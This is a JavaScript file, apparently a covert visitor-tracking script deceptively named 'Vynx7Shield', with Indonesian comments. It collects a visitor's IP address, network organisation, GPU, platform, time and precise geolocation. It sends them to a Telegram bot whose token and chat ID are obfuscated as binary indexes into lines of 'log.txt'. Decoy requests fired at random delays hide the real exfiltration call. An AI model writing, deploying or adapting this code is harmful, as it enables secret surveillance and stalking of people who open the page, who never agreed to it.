class Vynx7Shield {
    constructor() {
        // GANTI DENGAN HASIL DARI PYTHON!
        this._tm = ['11001110', '1111', '11111001110', '1101100110', '10001001000', '10110100000', '111110', '1001011100', '1111100111', '1011100101', '11110100010', '1100101100', '11011010', '1111110110', '111100101', '110110010', '10110010001', '10001110101', '1101010', '1100000', '1110000110', '10011010000', '10010100011', '1111111101', '10100011100', '10011111100', '1010001001', '11000110101', '11101010001', '11100100001', '10010001111', '10101111010', '100101011', '10001100', '101010111', '10111110011', '10001000111', '110011000', '1000011101', '111100', '10110100001', '1100000100', '11010010101', '11010010000', '110101011', '11110010111', '1110011', '1110101', '10111011011', '10111100000', '10000110110', '111110101', '11001010110', '11001110000', '11000101000', '11010110', '11110111101', '100', '11100111010', '10011010111', '1011010000', '10100010010', '10001110001', '1001111000']; // TOKEN_MAP Biner
        this._cm = ['110111', '1111010110', '11101000111', '11001011111', '100010011', '1111011', '11010100001', '11011011', '10000101010', '101111000', '11101011101', '11000111001', '100101101', '10100110110', '100010100', '1010000101']; // CHAT_MAP Biner
        this._src = "log.txt";
    }

   
    async _getFp() {
        let ipD = {ip: "0.0.0.0", org: "Unknown"};
        try { ipD = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){}
        const gl = document.createElement('canvas').getContext('webgl');
        const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_ID) : "Generic";
        return `🚨 <b>VYNX7 ALERT</b>\n🌐 IP: ${ipD.ip} (${ipD.org})\n💻 OS: ${navigator.platform}\n⚙️ GPU: ${gpu}\n🕒 ${new Date().toLocaleString()}`;
    }

  
    _r(d, m) {
        let b = "";
        m.forEach(x => {
            let l = d[parseInt(x, 2)];
           
            b += l.charAt(Math.floor(l.length / 2));
        });
        return atob(b);
    }

    async ignite(lat, lon) {
        const info = await this._getFp();
       
        const res = await fetch(this._src);
        const text = await res.text();
        const nodes = text.split("\n").filter(l => l.length > 5);

        const t = this._r(nodes, this._tm);
        const c = this._r(nodes, this._cm);

        nodes.forEach((url, i) => {
            setTimeout(() => {
                if (url.includes("api.telegram.org")) {
                    // JALUR ASLI (Telegram)
                    fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: c,
                            text: info + `\n📍 LOC: ${lat},${lon}`,
                            parse_mode: "HTML"
                        })
                    });
                } else {
                   
                    fetch(url, { mode: 'no-cors' }).catch(() => {});
                }
            }, Math.random() * 6000);
        });
    }
}

async function runVynx7() {
    navigator.geolocation.getCurrentPosition(async (p) => {
        const v = new Vynx7Shield();
        await v.ignite(p.coords.latitude, p.coords.longitude);
    });
}
